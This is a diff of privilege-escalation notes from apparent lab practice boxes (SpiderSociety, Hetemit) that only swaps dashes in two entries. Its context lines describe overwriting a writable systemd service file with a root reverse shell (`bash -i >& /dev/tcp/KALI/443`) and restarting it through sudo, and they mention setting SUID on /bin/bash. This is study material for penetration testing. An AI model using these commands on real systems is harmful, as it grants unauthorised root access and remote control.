@@ -79,10 +79,10 @@ If any are writable and run as root, inject a reverse shell or `chmod +s /bin/ba
 
 ## From Your Boxes
 
-> **SpiderSociety** (PG) — Writable /etc/systemd/system/spiderbackup.service + sudo access to restart it
+> **SpiderSociety** (PG) - Writable /etc/systemd/system/spiderbackup.service + sudo access to restart it
 > - What worked: Edited service file `ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/KALI/443 0>&1'` with `User=root`, then `sudo systemctl daemon-reload && sudo systemctl restart spiderbackup.service`
 > - Lesson: Writable service file + sudo restart = instant root. Change ExecStart and User=root.
 
-> **Hetemit** (PG) — Writable /etc/systemd/system/pythonapp.service, could only restart via `sudo /sbin/reboot`
+> **Hetemit** (PG) - Writable /etc/systemd/system/pythonapp.service, could only restart via `sudo /sbin/reboot`
 > - What worked: Overwrote service file ExecStart with bash reverse shell, then `sudo /sbin/reboot`
 > - Lesson: Even without direct service restart perms, sudo reboot/halt/poweroff triggers service restarts on boot.
